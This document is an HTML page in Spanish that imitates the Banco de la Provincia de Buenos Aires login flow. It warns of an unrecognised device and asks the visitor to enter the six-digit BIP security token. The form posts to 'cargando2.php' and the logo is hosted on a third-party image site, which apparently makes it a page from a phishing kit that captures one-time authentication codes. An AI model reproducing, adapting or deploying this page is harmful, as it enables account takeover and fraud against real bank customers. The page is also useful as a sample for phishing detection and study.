<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco de la Provincia de Buenos Aires</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="todo">
    <header>
        <img  src="https://i.postimg.cc/qq0fChbR/loggoo.png" alt="">
    </header>
    <main>
        <div class="caja">
            <div class="titu">
                <h2>Dispositivo no reconocido</h2>
            </div>
            <form action="cargando2.php" method="post">
                <b>Debemos validar tu identidad, Accede a BIP Movil y obtene el token de seguridad:</b>
            <br><br>
                <div class="cam">
                    
                <input type="text" placeholder="Ingresa el token de 6 digitos" required="" name="t1" minlength="6" maxlength="6">

                </div>
           <br><br>
            <div class="teclado">
                <p>Recordá que tu BIP Token vence cada 30 segundos...</p><img src="" alt="">
            </div>
            <div class="btn">
                <input id="button"  type="submit" value="Continuar">
            </div>
            </form>
            <div class="adis" style="line-height: 1.4!important; padding-top:10px;">
            De no poseer su BIP Token activo lo podés generar desde Cuenta DNI y realizá los siguientes pasos: Desplegá el menú contextual y selecciona la opción “Generar código de autenticación”.
            </div>
        </div>
    </main>
</div>
</body>
</html>